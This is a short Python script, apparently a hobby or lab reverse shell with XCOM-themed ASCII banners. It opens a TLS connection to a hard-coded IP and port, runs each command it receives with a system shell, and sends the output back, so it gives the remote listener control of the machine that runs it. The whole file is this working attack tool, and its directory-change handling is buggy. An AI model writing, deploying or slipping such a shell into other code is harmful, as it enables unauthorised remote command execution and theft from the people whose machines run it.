import os,socket,subprocess;
import ssl

global RHOST 
global RPORT 
global ssls
global s
RHOST= "192.168.41.144"
RPORT= 7443

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_SSLv23)
ssls = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1_2)
ssls.connect((RHOST,RPORT))
ssls.send(b'''Connected 
 /$$   /$$  /$$$$$$   /$$$$$$  /$$      /$$      
| $$  / $$ /$$__  $$ /$$__  $$| $$$    /$$$      
|  $$/ $$/| $$  \__/| $$  \ $$| $$$$  /$$$$      
 \  $$$$/ | $$      | $$  | $$| $$ $$/$$ $$      
  >$$  $$ | $$      | $$  | $$| $$  $$$| $$      
 /$$/\  $$| $$    $$| $$  | $$| $$\  $ | $$      
| $$  \ $$|  $$$$$$/|  $$$$$$/| $$ \/  | $$      
|__/  |__/ \______/  \______/ |__/     |__/      
                                                 
         
byebye to quit. But the sectoids will control you mind.
''')
ssls.send(str.encode(os. getcwd()+"\\"))
while True :
    data= ssls.recv(2048)
    print(str(data,"utf-8"))
    if(str(data,"utf-8")== 'byebye\n'):
        ssls.send(b'''Connected 
        XCOM will back soon   
                                                             
$$\   $$\  $$$$$$\   $$$$$$\  $$\      $$\       
$$ |  $$ |$$  __$$\ $$  __$$\ $$$\    $$$ |      
\$$\ $$  |$$ /  \__|$$ /  $$ |$$$$\  $$$$ |      
 \$$$$  / $$ |      $$ |  $$ |$$\$$\$$ $$ |      
 $$  $$<  $$ |      $$ |  $$ |$$ \$$$  $$ |      
$$  /\$$\ $$ |  $$\ $$ |  $$ |$$ |\$  /$$ |      
$$ /  $$ |\$$$$$$  | $$$$$$  |$$ | \_/ $$ |      
\__|  \__| \______/  \______/ \__|     \__|    

        ''')
        ssls.close()
        exit()
    if(data[:2]== 'cd'):
        if (os.path.exists(str(data[:3]).replace('\n',''))):
            os.chdir(str(data[:3]).replace('\n',''))
            ssls.send(str.encode(os. getcwd()+"\\"))
    else:
        process =subprocess.Popen(str(data,"utf-8"), shell= True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        out = process.stdout.read()+process.stderr.read()
        ssls.send(out)
        ssls.send(str.encode(os. getcwd()+"\\"))

    #process.stdout.read()+ process.stderr.read()




